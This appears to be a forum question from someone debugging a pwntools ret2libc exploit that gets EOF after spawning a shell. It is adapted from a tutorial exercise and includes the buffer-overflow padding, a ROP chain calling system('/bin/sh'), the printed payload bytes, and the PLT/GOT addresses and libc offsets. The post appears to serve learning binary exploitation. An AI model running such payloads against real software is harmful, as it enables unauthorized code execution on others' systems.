    "content": "When I run <pre><code>pwntools</code></pre>, I'm getting\n<pre><code>[+] Here comes the shell!\n[*] Switching to interactive mode\n[*] Got EOF while reading in interactive\n$  \n</code></pre>\nWhy is it getting <pre><code>EOF</code></pre>? Where should I start looking for the problem, currently my second payload is\n<pre><code># Build 2nd payload\npayload2  =  b'A'*140\nropchain2 =  p32(system_addr)\nropchain2 += p32(exit_addr)\n# Optional: Fix disallowed character by scanf by using p32(binsh_addr+5)\n#           Thus you'll execute system(\"sh\")\nropchain2 += p32(binsh_addr) \n\npayload2 = payload2 + ropchain2            \np.sendline(payload2)                       \n\nlog.success(\"Here comes the shell!\")       \n\np.clean()                                  \np.interactive()                            \n</code></pre>\nThis is adapted from the Megabeets example with the modification given here\nIf I <pre><code>print(payload2)</code></pre>, I get\n<pre><code>b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\x00\\xe2\\xdd\\xf7\\xd0\\x13\\xdd\\xf7\\xcf\\xf0\\xf1\\xf7'\n</code></pre>\nWhich seems correct. The values I used to generate the payload are,\n<pre><code># Addresses                        \nputs_plt    = 0x08048390           \nputs_got    = 0x0804a014           \nentry_point = 0x080483d0           \n\n# Offsets                          \noffset_puts       = 0x00067b40     \noffset_system     = 0x0003d200     \noffset_exit       = 0x000303d0     \noffset_str_bin_sh = 0x17e0cf     \n</code></pre>\n",
